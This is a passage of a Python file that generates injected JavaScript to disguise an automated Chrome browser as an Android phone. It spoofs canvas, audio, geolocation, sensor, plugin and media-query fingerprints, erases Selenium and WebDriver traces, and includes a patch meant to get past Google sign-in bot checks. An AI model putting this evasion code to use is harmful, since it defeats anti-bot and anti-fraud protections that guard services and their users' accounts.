  if(window.OffscreenCanvas)_hookGetContext(OffscreenCanvas.prototype);
}})();
(function(){{
  var seed={cs};
  function _xc(d){{if(!d||d.data.length<4)return;d.data[0]=d.data[0]^seed;d.data[3]=d.data[3]^((seed*7)&0xFF);if(d.data.length>8){{d.data[4]=d.data[4]^((seed*3)&0xFF);}}}}
  var o=HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL=function(){{var c=this.getContext('2d');if(c){{var d=c.getImageData(0,0,this.width||1,this.height||1);_xc(d);c.putImageData(d,0,0);}}return o.apply(this,arguments);}};
  var ob=HTMLCanvasElement.prototype.toBlob;
  if(ob)HTMLCanvasElement.prototype.toBlob=function(cb,t,q){{var c=this.getContext('2d');if(c){{var d=c.getImageData(0,0,this.width||1,this.height||1);_xc(d);c.putImageData(d,0,0);}}return ob.call(this,cb,t,q);}};
  var og=CanvasRenderingContext2D.prototype.getImageData;
  CanvasRenderingContext2D.prototype.getImageData=function(){{var d=og.apply(this,arguments);_xc(d);return d;}};
  if(window.__nr){{window.__nr(HTMLCanvasElement.prototype.toDataURL,'toDataURL');if(HTMLCanvasElement.prototype.toBlob)window.__nr(HTMLCanvasElement.prototype.toBlob,'toBlob');window.__nr(CanvasRenderingContext2D.prototype.getImageData,'getImageData');}}
}})();
(function(){{
  var noise={an};
  var orig=AudioBuffer&&AudioBuffer.prototype.getChannelData;
  if(orig)AudioBuffer.prototype.getChannelData=function(){{
    var d=orig.apply(this,arguments);
    if(d&&d.length>0){{
      try{{d[0]=d[0]+noise;}}catch(e){{}}
      try{{if(d.length>1)d[1]=d[1]-noise*0.7;}}catch(e){{}}
      try{{if(d.length>3)d[3]=d[3]+noise*0.4;}}catch(e){{}}
    }}
    return d;
  }};
  if(window.__nr&&AudioBuffer&&AudioBuffer.prototype.getChannelData)window.__nr(AudioBuffer.prototype.getChannelData,'getChannelData');
}})();
try{{var _tz='{tz}';var _dto=Intl.DateTimeFormat;function _dtow(l,o){{o=o||{{}};if(!o.timeZone)o.timeZone=_tz;return new _dto(l,o);}}try{{Object.keys(_dto).forEach(function(k){{_dtow[k]=_dto[k];}});}}catch(e2){{}}try{{_dtow.prototype=_dto.prototype;}}catch(e3){{}}Intl.DateTimeFormat=_dtow;}}catch(e){{}}
(function(){{
  try{{
    var _origRTC=window.RTCPeerConnection;
    if(_origRTC){{
      window.RTCPeerConnection=function(cfg){{
        if(cfg&&cfg.iceServers)cfg.iceServers=[];
        return new _origRTC(cfg);
      }};
      window.RTCPeerConnection.prototype=_origRTC.prototype;
    }}
    window.webkitRTCPeerConnection=undefined;
    window.mozRTCPeerConnection=undefined;
  }}catch(e){{}}
}})();
try{{navigator.vibrate=function(){{return true;}};}}catch(e){{}}
try{{
  var _vvp=window.visualViewport;
  if(_vvp){{
    try{{Object.defineProperty(_vvp,'width',{{get:()=>{sw}}});}}catch(e){{}}
    try{{Object.defineProperty(_vvp,'height',{{get:()=>{ah}}});}}catch(e){{}}
    try{{Object.defineProperty(_vvp,'offsetLeft',{{get:()=>0}});}}catch(e){{}}
    try{{Object.defineProperty(_vvp,'offsetTop',{{get:()=>0}});}}catch(e){{}}
    try{{Object.defineProperty(_vvp,'pageLeft',{{get:()=>0}});}}catch(e){{}}
    try{{Object.defineProperty(_vvp,'pageTop',{{get:()=>0}});}}catch(e){{}}
    try{{Object.defineProperty(_vvp,'scale',{{get:()=>1}});}}catch(e){{}}
  }}
}}catch(e){{}}
// appVersion already set on Navigator.prototype above
// onLine: on Navigator.prototype not instance
try{{Object.defineProperty(Navigator.prototype,'onLine',{{get:function(){{return true;}},configurable:true,enumerable:true}});}}catch(e){{}}
try{{
  if(navigator.permissions&&navigator.permissions.query){{
    var _origPQ2=navigator.permissions.query.bind(navigator.permissions);
    navigator.permissions.query=function(p){{
      if(p&&(p.name==='camera'||p.name==='microphone'||p.name==='geolocation'))
        return Promise.resolve({{state:'prompt',onchange:null}});
      if(p&&(p.name==='accelerometer'||p.name==='gyroscope'||p.name==='magnetometer'||p.name==='ambient-light-sensor'))
        return Promise.resolve({{state:'granted',onchange:null}});
      return _origPQ2(p);
    }};
  }}
}}catch(e){{}}
try{{
  if(navigator.mediaDevices){{
    navigator.mediaDevices.enumerateDevices=function(){{
      return Promise.resolve([
        {{kind:'videoinput',deviceId:'{cam_rear_id}',groupId:'{cam_group}',label:''}},
        {{kind:'videoinput',deviceId:'{cam_front_id}',groupId:'{cam_group}',label:''}},
        {{kind:'audioinput',deviceId:'{mic_id}',groupId:'{mic_group}',label:''}},
        {{kind:'audiooutput',deviceId:'default',groupId:'{mic_group}',label:''}},
      ]);
    }};
  }}
}}catch(e){{}}
// screen.availLeft / availTop now on Screen.prototype via _sd() above
// javaEnabled on Navigator.prototype (not instance) — real Chrome exposes this as a prototype method
try{{Object.defineProperty(Navigator.prototype,'javaEnabled',{{value:function(){{return false;}},writable:false,configurable:true}});}}catch(e){{}}
try{{document.hasFocus=function(){{return true;}};}}catch(e){{}}
try{{
  Object.defineProperty(navigator,'share',{{value:function(data){{return Promise.resolve();}},writable:false,configurable:true}});
}}catch(e){{}}
try{{
  if(!navigator.getInstalledRelatedApps){{
    Object.defineProperty(navigator,'getInstalledRelatedApps',{{value:function(){{return Promise.resolve([]);}},writable:false,configurable:true}});
  }}
}}catch(e){{}}
try{{
  if(!navigator.wakeLock){{
    Object.defineProperty(navigator,'wakeLock',{{get:function(){{return{{request:function(t){{return Promise.resolve({{type:t,released:false,release:function(){{return Promise.resolve();}},addEventListener:function(){{}},removeEventListener:function(){{}}}});}}}}}},configurable:true}});
  }}
}}catch(e){{}}
try{{
  if(!navigator.virtualKeyboard){{
    Object.defineProperty(navigator,'virtualKeyboard',{{get:function(){{return{{show:function(){{}},hide:function(){{}},overlaysContent:false,boundingRect:{{x:0,y:0,width:0,height:0,top:0,right:0,bottom:0,left:0}},addEventListener:function(){{}},removeEventListener:function(){{}}}}}},configurable:true}});
  }}
}}catch(e){{}}
try{{
  var _dMem={fp['deviceMemory']};
  var _heapLim=Math.round(_dMem*268435456);
  var _heapTot=Math.round((45+Math.random()*35)*1048576);
  var _heapUsd=Math.round((25+Math.random()*25)*1048576);
  if(window.performance&&!Object.getOwnPropertyDescriptor(performance,'memory')){{
    Object.defineProperty(performance,'memory',{{get:function(){{return{{jsHeapSizeLimit:_heapLim,totalJSHeapSize:_heapTot,usedJSHeapSize:_heapUsd}}}},configurable:true}});
  }}
}}catch(e){{}}
try{{
  if(typeof DeviceMotionEvent!=='undefined'&&!DeviceMotionEvent.requestPermission){{
    DeviceMotionEvent.requestPermission=function(){{return Promise.resolve('granted');}};
  }}
  if(typeof DeviceOrientationEvent!=='undefined'&&!DeviceOrientationEvent.requestPermission){{
    DeviceOrientationEvent.requestPermission=function(){{return Promise.resolve('granted');}};
  }}
}}catch(e){{}}
(function(){{
  try{{
    var _omm=window.matchMedia&&window.matchMedia.bind(window);
    if(!_omm)return;
    function _mmr(q,m){{return{{matches:m,media:q,onchange:null,addListener:function(){{}},removeListener:function(){{}},addEventListener:function(){{}},removeEventListener:function(){{}},dispatchEvent:function(){{return true;}}}};}}
    window.matchMedia=function(q){{
      var s=(q||'').replace(/\s+/g,'').toLowerCase();
      if(s==='(pointer:coarse)')return _mmr(q,true);
      if(s==='(pointer:fine)')return _mmr(q,false);
      if(s==='(hover:none)')return _mmr(q,true);
      if(s==='(hover:hover)')return _mmr(q,false);
      if(s==='(any-pointer:coarse)')return _mmr(q,true);
      if(s==='(any-pointer:fine)')return _mmr(q,false);
      if(s==='(any-hover:hover)')return _mmr(q,false);
      if(s==='(any-hover:none)')return _mmr(q,true);
      if(s==='(prefers-color-scheme:dark)')return _mmr(q,true);
      if(s==='(prefers-color-scheme:light)')return _mmr(q,false);
      if(s==='(orientation:portrait)')return _mmr(q,true);
      if(s==='(orientation:landscape)')return _mmr(q,false);
      if(s==='(display-mode:browser)')return _mmr(q,true);
      if(s==='(display-mode:standalone)')return _mmr(q,false);
      if(s==='(prefers-reduced-motion:reduce)')return _mmr(q,false);
      if(s==='(prefers-reduced-motion:no-preference)')return _mmr(q,true);
      if(s==='(color-gamut:srgb)')return _mmr(q,true);
      if(s==='(color-gamut:p3)')return _mmr(q,false);
      if(s==='(color-gamut:rec2020)')return _mmr(q,false);
      if(s==='(prefers-contrast:no-preference)')return _mmr(q,true);
      if(s==='(prefers-contrast:more)')return _mmr(q,false);
      if(s==='(prefers-contrast:less)')return _mmr(q,false);
      if(s==='(prefers-contrast:forced)')return _mmr(q,false);
      if(s==='(forced-colors:none)')return _mmr(q,true);
      if(s==='(forced-colors:active)')return _mmr(q,false);
      if(s==='(inverted-colors:none)')return _mmr(q,true);
      if(s==='(inverted-colors:inverted)')return _mmr(q,false);
      if(s==='(update:fast)')return _mmr(q,true);
      if(s==='(update:slow)')return _mmr(q,false);
      if(s==='(update:none)')return _mmr(q,false);
      if(s==='(dynamic-range:standard)')return _mmr(q,true);
      if(s==='(dynamic-range:high)')return _mmr(q,false);
      if(s==='(overflow-block:scroll)')return _mmr(q,true);
      if(s==='(overflow-block:optional-paged)')return _mmr(q,false);
      if(s==='(overflow-inline:scroll)')return _mmr(q,true);
      // VM detection fix: resolution/dpi media queries — spoof to match device DPI.
      // CSS resolution = devicePixelRatio × 96 dpi (standard CSS definition).
      // Pixel 6 DPR=2.625 → ~252dpi. VM default would return real display DPI (~96).
      if(s.indexOf('resolution')!==-1){{
        var _dpiExpected=Math.round({fp['dpr']}*96);
        var _mDpi=s.match(/([0-9]+(?:\.[0-9]*)?)dpi/);
        if(_mDpi)return _mmr(q,Math.abs(parseFloat(_mDpi[1])-_dpiExpected)<30);
        var _mDppx=s.match(/([0-9]+(?:\.[0-9]*)?)dppx/);
        if(_mDppx)return _mmr(q,Math.abs(parseFloat(_mDppx[1])-{fp['dpr']})<0.15);
      }}
      return _omm(q);
    }};
    if(window.__nr)window.__nr(window.matchMedia,'matchMedia');
  }}catch(e){{}}
}})();
try{{
  Date.prototype.getTimezoneOffset=function(){{return {_tz_offset};}};
}}catch(e){{}}
try{{delete window.chrome.cast;}}catch(e){{}}
// chrome.webstore, chrome.app, chrome.runtime.id cleaned in automation globals block above
try{{
  if(window.speechSynthesis){{
    var _origGV=window.speechSynthesis.getVoices.bind(window.speechSynthesis);
    window.speechSynthesis.getVoices=function(){{
      var existing=_origGV();
      if(existing&&existing.length>0)return existing;
      function _v(n,l,d){{return{{name:n,lang:l,default:d,localService:false,voiceURI:n,
        toString:function(){{return'[object SpeechSynthesisVoice]';}}}};}}
      return[
        _v('Google US English','en-US',true),
        _v('Google UK English Female','en-GB',false),
        _v('Google UK English Male','en-GB',false),
        _v('Google Deutsch','de-DE',false),
        _v('Google español','es-ES',false),
      ];
    }};
    if(window.__nr)window.__nr(window.speechSynthesis.getVoices,'getVoices');
  }}
}}catch(e){{}}
try{{
  function _makeSensor(name){{
    if(!window[name]){{
      window[name]=function(opts){{
        this.start=function(){{}};this.stop=function(){{}};
        this.addEventListener=function(){{}};this.removeEventListener=function(){{}};
        this.x=0;this.y=0;this.z=0;this.quaternion=null;
        this.timestamp=performance.now();this.activated=false;this.hasReading=false;
      }};
      window[name].prototype=Object.create(EventTarget.prototype);
    }}
  }}
  _makeSensor('Accelerometer');_makeSensor('Gyroscope');
  _makeSensor('LinearAccelerationSensor');_makeSensor('GravitySensor');
  _makeSensor('AbsoluteOrientationSensor');_makeSensor('RelativeOrientationSensor');
  _makeSensor('Magnetometer');_makeSensor('AmbientLightSensor');
}}catch(e){{}}
try{{
  if(!navigator.bluetooth){{
    Object.defineProperty(navigator,'bluetooth',{{
      get:function(){{return{{
        requestDevice:function(){{return Promise.reject(new DOMException('No device selected','NotFoundError'));}},
        getAvailability:function(){{return Promise.resolve(true);}},
        addEventListener:function(){{}},removeEventListener:function(){{}}
      }}}},configurable:true
    }});
  }}
}}catch(e){{}}
try{{
  if(!navigator.contacts){{
    Object.defineProperty(navigator,'contacts',{{
      get:function(){{return{{
        select:function(){{return Promise.reject(new DOMException('Not allowed','SecurityError'));}},
        getProperties:function(){{return Promise.resolve(['name','email','tel']);}},
      }}}},configurable:true
    }});
  }}
}}catch(e){{}}
try{{
  if(!navigator.mediaSession){{
    Object.defineProperty(navigator,'mediaSession',{{
      get:function(){{return{{
        metadata:null,playbackState:'none',
        setActionHandler:function(){{}},setPositionState:function(){{}},
        setMicrophoneActive:function(){{}},setCameraActive:function(){{}}
      }}}},configurable:true
    }});
  }}
}}catch(e){{}}
try{{
  if(navigator.storage&&navigator.storage.estimate){{
    var _origEst=navigator.storage.estimate.bind(navigator.storage);
    var _storageUsage=Math.round((80+Math.random()*120)*1048576);
    navigator.storage.estimate=function(){{
      var _dMem={fp['deviceMemory']};
      return Promise.resolve({{
        quota:Math.round(_dMem*1073741824*0.6),
        usage:_storageUsage,
        usageDetails:{{caches:Math.round(20*1048576),indexedDB:Math.round(5*1048576),serviceWorkerRegistrations:Math.round(1*1048576)}}
      }});
    }};
  }}
}}catch(e){{}}
try{{
  if(window.speechSynthesis){{
    var _fv=[
      {{default:true,lang:'{lg}',name:'Google US English',localService:false,voiceURI:'Google US English'}},
      {{default:false,lang:'en-GB',name:'Google UK English Female',localService:false,voiceURI:'Google UK English Female'}},
      {{default:false,lang:'en-GB',name:'Google UK English Male',localService:false,voiceURI:'Google UK English Male'}},
    ];
    Object.defineProperty(window.speechSynthesis,'onvoiceschanged',{{get:()=>null,set:function(fn){{if(fn)setTimeout(fn,0);}}}});
    var _ogv=window.speechSynthesis.getVoices.bind(window.speechSynthesis);
    window.speechSynthesis.getVoices=function(){{var r=_ogv();return(r&&r.length)?r:_fv;}};
    if(window.__nr)window.__nr(window.speechSynthesis.getVoices,'getVoices');
  }}
}}catch(e){{}}
try{{
  if(navigator.mediaCapabilities&&navigator.mediaCapabilities.decodingInfo){{
    var _origDI=navigator.mediaCapabilities.decodingInfo.bind(navigator.mediaCapabilities);
    navigator.mediaCapabilities.decodingInfo=function(cfg){{
      return _origDI(cfg).then(function(r){{
        return{{supported:true,smooth:true,powerEfficient:true}};
      }}).catch(function(){{
        return{{supported:true,smooth:true,powerEfficient:true}};
      }});
    }};
  }}
}}catch(e){{}}
try{{
  if(!window.SpeechRecognition&&window.webkitSpeechRecognition){{
    window.SpeechRecognition=window.webkitSpeechRecognition;
  }}
  if(!window.SpeechRecognition){{
    window.SpeechRecognition=function(){{
      this.start=function(){{}};this.stop=function(){{}};this.abort=function(){{}};
      this.continuous=false;this.interimResults=false;this.lang='{lg}';
      this.addEventListener=function(){{}};this.removeEventListener=function(){{}};
    }};
  }}
}}catch(e){{}}
try{{
  if(!navigator.scheduling){{
    Object.defineProperty(navigator,'scheduling',{{
      get:function(){{return{{isInputPending:function(){{return false;}}}}}},configurable:true
    }});
  }}
}}catch(e){{}}
try{{
  if(!navigator.devicePosture){{
    Object.defineProperty(navigator,'devicePosture',{{
      get:function(){{return{{type:'continuous',
        addEventListener:function(){{}},removeEventListener:function(){{}},dispatchEvent:function(){{return true;}}}}}},
      configurable:true
    }});
  }}
}}catch(e){{}}
try{{
  var _pnBase=performance.now.bind(performance);
  var _pnJ=(Math.random()-0.5)*0.4;
  performance.now=function(){{return _pnBase()+_pnJ;}};
  if(window.__nr)window.__nr(performance.now,'now');
}}catch(e){{}}
try{{
  var _geoLat={lat};var _geoLon={lon};
  var _geoAcc=Math.round(10+Math.random()*25);
  var _geoAlt=Math.round(20+Math.random()*80);
  if(navigator.geolocation){{
    var _origGeo=navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
    var _origGeoW=navigator.geolocation.watchPosition.bind(navigator.geolocation);
    function _mkPos(){{
      var coords={{latitude:_geoLat,longitude:_geoLon,accuracy:_geoAcc,altitude:_geoAlt,
        altitudeAccuracy:Math.round(3+Math.random()*7),heading:null,speed:null,
        toJSON:function(){{return{{latitude:_geoLat,longitude:_geoLon,accuracy:_geoAcc}};}}}};
      return{{coords:coords,timestamp:Date.now(),toJSON:function(){{return{{coords:coords,timestamp:this.timestamp}};}}}};
    }}
    navigator.geolocation.getCurrentPosition=function(ok,err,opts){{
      try{{ok(_mkPos());}}catch(e){{if(err)err(e);}}
    }};
    navigator.geolocation.watchPosition=function(ok,err,opts){{
      try{{ok(_mkPos());}}catch(e){{if(err)err(e);}}
      return Math.floor(Math.random()*1000)+1;
    }};
  }}
}}catch(e){{}}
try{{
  var _dmAlpha=Math.random()*0.3-0.15;
  var _dmBeta= Math.random()*0.4-0.2;
  var _dmGamma=Math.random()*0.2-0.1;
  var _origAEL=window.addEventListener.bind(window);
  window.addEventListener=function(type,fn,opts){{
    _origAEL(type,fn,opts);
    if(type==='deviceorientation'&&fn){{
      setTimeout(function(){{
        try{{fn(new DeviceOrientationEvent('deviceorientation',
          {{alpha:_dmAlpha,beta:_dmBeta,gamma:_dmGamma,absolute:false}}));}}catch(e){{}}
      }},50);
    }}
    if(type==='devicemotion'&&fn){{
      setTimeout(function(){{
        try{{
          var _evt=new DeviceMotionEvent('devicemotion',{{
            accelerationIncludingGravity:{{x:_dmGamma*9.8,y:_dmBeta*9.8,z:9.8+_dmAlpha}},
            acceleration:{{x:_dmGamma*0.1,y:_dmBeta*0.1,z:_dmAlpha*0.05}},
            rotationRate:{{alpha:_dmAlpha*10,beta:_dmBeta*8,gamma:_dmGamma*5}},
            interval:16
          }});
          fn(_evt);
        }}catch(e){{}}
      }},60);
    }}
  }};
}}catch(e){{}}
try{{
  var _androidFonts=['Roboto','Noto Sans','Noto Serif','Droid Sans','Droid Serif',
    'Droid Sans Mono','Cutive Mono','Coming Soon','Dancing Script','Carrois Gothic SC',
    'Noto Color Emoji','Android Emoji','sans-serif','serif','monospace','cursive'];
  if(document.fonts&&document.fonts.check){{
    var _origFCheck=document.fonts.check.bind(document.fonts);
    document.fonts.check=function(font,text){{
      var _f=(font||'').replace(/[0-9]+px\s*/,'').replace(/["']/g,'').trim();
      if(_androidFonts.indexOf(_f)!==-1)return true;
      return _origFCheck(font,text);
    }};
  }}
}}catch(e){{}}
(function(){{
  // ── Automation globals cleanup ─────────────────────────────────────────────
  // CDP / Selenium / WebDriver leave window-level variables that fingerprinters
  // enumerate. Delete every known automation trace on every new document.
  var _bad=[
    '__webdriver_evaluate','__selenium_evaluate','__webdriver_script_fn',
    '__webdriver_script_func','__webdriver_script_function','__fxdriver_evaluate',
    '__driver_unwrapped','__webdriver_unwrapped','__driver_evaluate',
    '__selenium_unwrapped','__fxdriver_unwrapped','_Selenium_IDE_Recorder',
    '_selenium','calledSelenium','$cdc_asdjflasutopfhvcZLmcfl_',
    '__$webdriverAsyncExecutor','__lastWatirAlert','__lastWatirConfirm',
    '__lastWatirPrompt','_WEBDRIVER_ELEM_CACHE','ChromeDriverw',
    'cdc_adoQpoasnfa76pfcZLmcfl_Array',
    'cdc_adoQpoasnfa76pfcZLmcfl_Promise',
    'cdc_adoQpoasnfa76pfcZLmcfl_Symbol',
    '__webdriverio_element','webdriverio',
    'domAutomation','domAutomationController',
    '__lastWatirPrompt','_WEBDRIVER_ELEM_CACHE'
  ];
  _bad.forEach(function(k){{try{{delete window[k];}}catch(e){{}}try{{delete document[k];}}catch(e){{}}}});
  // Dynamic scan: UC Chrome 138 renames $cdc_ to a version-specific hash.
  // Delete ANY property whose name starts with 'cdc_' or '$cdc_' regardless of suffix.
  try{{
    Object.keys(window).forEach(function(k){{
      if(k.startsWith('cdc_')||k.startsWith('$cdc_')){{
        try{{delete window[k];}}catch(e){{}}
      }}
    }});
  }}catch(e){{}}
  // Patch Error so stack traces never leak DevTools Protocol paths
  try{{
    var _origErr=Error;
    function _PatchedError(){{
      var e=new _origErr(...arguments);
      if(e.stack)e.stack=e.stack.replace(/\\s+at\\s+__puppeteer[^\\n]*/g,'').replace(/\\s+at\\s+__selenium[^\\n]*/g,'').replace(/\\s+at\\s+__cdc[^\\n]*/g,'');
      return e;
    }}
    _PatchedError.prototype=_origErr.prototype;
    _PatchedError.captureStackTrace=_origErr.captureStackTrace;
    window.Error=_PatchedError;
  }}catch(e){{}}
  // DevTools open detection — spoof the property check
  try{{Object.defineProperty(window,'__devtools_open__',{{get:function(){{return false;}},configurable:true}});}}catch(e){{}}
  // Remove chrome.app and any extension runtime id — real Android Chrome has neither.
  // Unconditional defineProperty (no guard) so Chrome cannot restore app after script exit.
  try{{delete window.chrome.app;}}catch(e){{}}
  try{{if(window.chrome)Object.defineProperty(window.chrome,'app',{{get:function(){{return undefined;}},configurable:true,enumerable:false}});}}catch(e){{}}
  try{{delete window.chrome.webstore;}}catch(e){{}}
  try{{
    if(window.chrome&&window.chrome.runtime)
      Object.defineProperty(window.chrome.runtime,'id',{{get:function(){{return undefined;}},configurable:true}});
  }}catch(e){{}}
  // Dev-tools fix: Selenium/WebDriver sets a 'webdriver' attribute on <html>.
  // fingerprint.com reads document.documentElement.getAttribute('webdriver').
  // Remove it immediately and watch for re-injection via MutationObserver.
  try{{
    document.documentElement.removeAttribute('webdriver');
    if(window.MutationObserver){{
      var _mo=new MutationObserver(function(muts){{
        muts.forEach(function(m){{
          if(m.type==='attributes'&&m.attributeName==='webdriver'){{
            document.documentElement.removeAttribute('webdriver');
          }}
        }});
      }});
      _mo.observe(document.documentElement,{{attributes:true,attributeFilter:['webdriver']}});
    }}
  }}catch(e){{}}
  // Prevent document-level webdriver property exposure
  try{{Object.defineProperty(document,'__webdriver_script_fn',{{get:function(){{return undefined;}},configurable:true}});}}catch(e){{}}
}})();
// NOTE: window.__nr is intentionally NOT deleted here.
// The second addScriptToEvaluateOnNewDocument (make_plugins_override_js) needs it
// to register the plugins/mimeTypes getters as native-looking. That second script
// deletes window.__nr at its own end, after registration is complete.
"""


def make_login_stealth_js(fp: dict) -> str:
    """Small patch for Google sign-in.

    The full stealth script rewrites navigator, plugins, canvas, and toString.
    That raises bot/tamper scores and Google answers with signin/rejected
    ("this browser or app may not be secure") before the password field.
    Keep only the mismatches that are real on this host: WebGL vendor,
    desktop chrome.app, and the Keyboard API.
    """
    wv = str(fp.get("webglVendor", "")).replace("\\", "\\\\").replace("'", "\\'")
    wr = str(fp.get("webglRenderer", "")).replace("\\", "\\\\").replace("'", "\\'")
    return f"""
(function(){{
  ['log','debug','info','warn','error','table','dir','dirxml','trace'].forEach(function(k){{
    try{{console[k]=function(){{}};}}catch(e){{}}
  }});
  try{{delete window.chrome.app;}}catch(e){{}}
  try{{
    if(window.chrome) Object.defineProperty(window.chrome,'app',{{
      get:function(){{return undefined;}}, configurable:true, enumerable:false
    }});
  }}catch(e){{}}
  try{{delete Navigator.prototype.keyboard;}}catch(e){{}}
  try{{delete navigator.keyboard;}}catch(e){{}}
  try{{
    Object.defineProperty(Navigator.prototype,'keyboard',{{
      get:function(){{return undefined;}}, configurable:false, enumerable:false
    }});
  }}catch(e){{}}
  function _patch(Ctor){{
    if(!Ctor||!Ctor.prototype||!Ctor.prototype.getParameter)return;
    if(!Ctor.prototype.__fpNative) Ctor.prototype.__fpNative=Ctor.prototype.getParameter;
    var native=Ctor.prototype.__fpNative;
    Ctor.prototype.getParameter=function(p){{
      if(p===37445||p===7936)return '{wv}';
      if(p===37446||p===7937)return '{wr}';
      return native.call(this,p);
    }};
  }}
  _patch(window.WebGLRenderingContext);
  _patch(window.WebGL2RenderingContext);
}})();
"""


def get_chromium_path() -> str | None:
    """Prefer the bootstrapped Chrome for Testing binary over Nix Chromium."""
    candidates = [
        os.environ.get("CHROME_BINARY"),
        os.path.join(
            os.environ.get(
                "CHROME_FOR_TESTING_ROOT",
                os.path.expanduser("~/.cache/vanguard-mx/chrome-for-testing"),
            ),
            "current",
            "chrome",
        ),
    ]
    for candidate in candidates:
        if candidate and os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    for cmd in ("google-chrome", "chromium", "chromium-browser"):
        try:
            p = subprocess.check_output(
                ["which", cmd], encoding="utf8", stderr=subprocess.DEVNULL
            ).strip()
            if p:
                return p
        except Exception:
            pass
    return None


def make_plugins_override_js() -> str:
    """Second-pass inject: override Navigator.prototype.plugins and .mimeTypes.

    Must be injected as a SEPARATE addScriptToEvaluateOnNewDocument call AFTER
    the main stealth JS. Chrome's C++ initializes Navigator.prototype.plugins as
    non-configurable during the first injected script's execution window, then
    makes it configurable shortly after. A second injected script runs after that
    transition and can successfully override both properties.

    Also responsible for deleting window.__nr at the end (make_stealth_js no
    longer does it so that __nr is available here for native-toString registration
    of the plugins/mimeTypes getters).

    Do NOT merge this into make_stealth_js() — the timing split is intentional
    and required for the override to take effect.
    """
    return r"""
(function() {
  // ── Independent toString chain for getters defined in this script ──────────
  // Cannot reliably use window.__nr from the previous addScriptToEvaluateOnNewDocument
  // because Function.prototype.toString.call(fn) resolves through script-1's closure
  // WeakMap, and cross-script-boundary WeakMap key identity can fail in Chrome 149
  // (the _fpGet reference registered via window.__nr is not found in _ntm when the
  // diagnostic calls Function.prototype.toString.call(desc.get)).
  //
  // Fix: chain our own WeakMap onto whatever Function.prototype.toString currently is
  // (script-1 override if it worked, or native if not). The chain is transparent —
  // fingerprint.com cannot distinguish one WeakMap level from two.
  var _prevFPTS = Function.prototype.toString;
  var _ntm2 = new WeakMap();
  (function() {
    var _newFPTS = function toString() {
      if (_ntm2.has(this)) return _ntm2.get(this);
      try { return _prevFPTS.call(this); } catch(e) { return 'function () { [native code] }'; }
    };
    try {
      Function.prototype.toString = _newFPTS;
      _ntm2.set(_newFPTS, 'function toString() { [native code] }');
    } catch(e) {}
  })();
  function _reg(fn, name, isGetter) {
    try {
      if (fn && typeof fn === 'function')
        _ntm2.set(fn, 'function ' + (isGetter ? 'get ' : '') + name + '() { [native code] }');
    } catch(e) {}
  }

  // ── Capture native PluginArray/MimeTypeArray prototypes BEFORE overriding ──
  // Object.create(nativeProto) makes our fake objects pass `instanceof PluginArray`
  // checks and share the correct prototype chain — a plain {} would not.
  var _nativePP  = null;
  var _nativeMTP = null;
  try { _nativePP  = Object.getPrototypeOf(navigator.plugins);  } catch(e) {}
  try { _nativeMTP = Object.getPrototypeOf(navigator.mimeTypes); } catch(e) {}

  // ── plugins override ────────────────────────────────────────────────────────
  try {
    // Stable singleton — same reference on every access (not a new object each time).
    var _fp = _nativePP ? Object.create(_nativePP) : {};
    Object.defineProperties(_fp, {
      length:    { value: 0,                       writable: false, enumerable: true,  configurable: true },
      item:      { value: function(){ return null; }, writable: true,  enumerable: false, configurable: true },
      namedItem: { value: function(){ return null; }, writable: true,  enumerable: false, configurable: true },
      refresh:   { value: function(){},               writable: true,  enumerable: false, configurable: true },
    });
    try { _fp[Symbol.iterator] = function(){ return { next: function(){ return { done: true, value: undefined }; } }; }; } catch(e) {}
    var _fpGet = function(){ return _fp; };
    // Primary: register in our local WeakMap chain (works regardless of window.__nr)
    _reg(_fpGet, 'plugins', true);
    // Secondary: also try window.__nr from script-1 (belt-and-suspenders)
    if (window.__nr) { try { window.__nr(_fpGet, 'plugins', true); } catch(e) {} }
    // Tertiary: instance-level toString for direct .toString() calls (not .call())
    try { Object.defineProperty(_fpGet, 'toString', { value: function(){ return 'function get plugins() { [native code] }'; }, configurable: true, writable: true }); } catch(e) {}
    Object.defineProperty(Navigator.prototype, 'plugins', {
      get: _fpGet, configurable: true, enumerable: true
    });
  } catch(e) {}

  // ── mimeTypes override ──────────────────────────────────────────────────────
  try {
    var _fm = _nativeMTP ? Object.create(_nativeMTP) : {};
    Object.defineProperties(_fm, {
      length:    { value: 0,                       writable: false, enumerable: true,  configurable: true },
      item:      { value: function(){ return null; }, writable: true,  enumerable: false, configurable: true },
      namedItem: { value: function(){ return null; }, writable: true,  enumerable: false, configurable: true },
    });
    try { _fm[Symbol.iterator] = function(){ return { next: function(){ return { done: true, value: undefined }; } }; }; } catch(e) {}
    var _fmGet = function(){ return _fm; };
    _reg(_fmGet, 'mimeTypes', true);
    if (window.__nr) { try { window.__nr(_fmGet, 'mimeTypes', true); } catch(e) {} }
    try { Object.defineProperty(_fmGet, 'toString', { value: function(){ return 'function get mimeTypes() { [native code] }'; }, configurable: true, writable: true }); } catch(e) {}
    Object.defineProperty(Navigator.prototype, 'mimeTypes', {
      get: _fmGet, configurable: true, enumerable: true
    });
  } catch(e) {}

  // CDP's console domain invokes property getters on logged objects, which
  // fingerprint.com treats as "developer tools open". Replace console methods
  // with no-ops that do not touch their arguments, and label them native.
  ['log','debug','info','warn','error','table','dir','dirxml','trace'].forEach(function(k){
    try {
      var fn = function(){};
      _reg(fn, k, false);
      console[k] = fn;
    } catch(e) {}
  });

  // Second-pass: these are non-configurable during the first stealth script.
  // All phone profiles use 5 touch points. chrome.app and Keyboard API are
  // absent on real Android Chrome; leaving the desktop copies is tampering.
  try {
    delete Navigator.prototype.maxTouchPoints;
    var _tpGet = function(){ return 5; };
    _reg(_tpGet, 'maxTouchPoints', true);
    Object.defineProperty(Navigator.prototype, 'maxTouchPoints', {
      get: _tpGet, configurable: true, enumerable: true
    });
  } catch(e) {}

  // Re-lock keyboard on HTTPS — Chrome may add Keyboard API after script-1 runs.
  try { delete Navigator.prototype.keyboard; } catch(e) {}
  try { delete navigator.keyboard; } catch(e) {}
  try {
    Object.defineProperty(Navigator.prototype, 'keyboard', {
      get: function() { return undefined; },
      configurable: false,
      enumerable: false
    });
  } catch(e) {}

  // Strip desktop-only chrome.app if the browser assigned window.chrome between scripts.
  try {
    if (window.chrome) {
      try { delete window.chrome.app; } catch(e) {}
      try {
        Object.defineProperty(window.chrome, 'app', {
          get: function() { return undefined; },
          configurable: true,
          enumerable: false
        });
      } catch(e) {}
    }
  } catch(e) {}

  // ── Clean up __nr ───────────────────────────────────────────────────────────
  // make_stealth_js left window.__nr alive so this script could use it above.
